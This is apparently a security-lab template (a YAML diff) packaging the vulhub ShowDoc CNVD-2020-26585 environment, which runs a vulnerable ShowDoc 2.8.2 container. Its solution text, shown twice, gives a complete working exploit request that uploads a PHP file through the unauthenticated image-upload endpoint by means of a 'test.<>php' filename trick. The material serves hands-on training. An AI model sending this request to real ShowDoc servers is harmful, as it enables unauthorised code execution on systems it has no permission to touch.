@@ -1,0 +1,117 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-showdoc-cnvd-2020-26585
+  name: ShowDoc Unauthenticated File Upload and Remote Code Execution
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - showdoc
+  description: ShowDoc — ShowDoc Unauthenticated File Upload and Remote Code Execution (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/showdoc/CNVD-2020-26585
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/showdoc/CNVD-2020-26585
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - rce
+    - showdoc
+    difficulty: medium
+    summary: ShowDoc Unauthenticated File Upload and Remote Code Execution
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/showdoc/CNVD-2020-26585
+        ShowDoc is a tool greatly applicable for an IT team to share documents online. It can promote communication efficiency between members of a team.
+        ShowDoc version before 2.8.7, an unrestricted and unauthenticated file upload issue is found and attacker is able to upload a webshell and execute arbitrary code on server.
+        References:
+        - <https://github.com/star7th/showdoc/pull/1059>
+        - <https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a>
+        - <https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f>
+        # Vulnerable environment
+        Execute following command to start a ShowDoc server 2.8.2:
+        $ docker compose up -d
+        After the server is started, browse `http://your-ip:8080` to see the index page of ShowDoc.
+        # Exploit
+        Simply send following request to upload a PHP file:
+        $ POST /index.php?s=/home/page/uploadImg HTTP/1.1
+        $ Host: localhost:8080
+        $ Accept-Encoding: gzip, deflate, br
+        $ Accept: */*
+        $ Accept-Language: en-US;q=0.9,en;q=0.8
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+        $ Connection: close
+        $ Cache-Control: max-age=0
+        $ Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl
+        $ Content-Length: 213
+        $ ------WebKitFormBoundary0RdOKBR8AmAxfRyl
+        $ Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+        $ Content-Type: text/plain
+        $ <?=phpinfo();?>
+        $ ------WebKitFormBoundary0RdOKBR8AmAxfRyl--
+        PHP file address will be respond:
+        `phpinfo()` is executed successfully:
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/showdoc/CNVD-2020-26585
+        ShowDoc is a tool greatly applicable for an IT team to share documents online. It can promote communication efficiency between members of a team.
+        ShowDoc version before 2.8.7, an unrestricted and unauthenticated file upload issue is found and attacker is able to upload a webshell and execute arbitrary code on server.
+        References:
+        - <https://github.com/star7th/showdoc/pull/1059>
+        - <https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a>
+        - <https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f>
+        # Vulnerable environment
+        Execute following command to start a ShowDoc server 2.8.2:
+        $ docker compose up -d
+        After the server is started, browse `http://your-ip:8080` to see the index page of ShowDoc.
+        # Exploit
+        Simply send following request to upload a PHP file:
+        $ POST /index.php?s=/home/page/uploadImg HTTP/1.1
+        $ Host: localhost:8080
+        $ Accept-Encoding: gzip, deflate, br
+        $ Accept: */*
+        $ Accept-Language: en-US;q=0.9,en;q=0.8
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+        $ Connection: close
+        $ Cache-Control: max-age=0
+        $ Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl
+        $ Content-Length: 213
+        $ ------WebKitFormBoundary0RdOKBR8AmAxfRyl
+        $ Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+        $ Content-Type: text/plain
+        $ <?=phpinfo();?>
+        $ ------WebKitFormBoundary0RdOKBR8AmAxfRyl--
+        PHP file address will be respond:
+        `phpinfo()` is executed successfully:
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_80
+    group:
+      fr: Accès
+      en: Access
+    label: web 80/tcp
+    type: port
+    default: 8080
+services:
+  web:
+    role: main
+    image: vulhub/showdoc
+    tag: 2.8.2@sha256:1e545eb020c989bb88e5de4c1dc69d951038505f5d96340d8a11d75145b5fcfb
+    frozen: true
+    ports:
+    - container: 80
+      host: '{{ form.port_80 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_80 }}
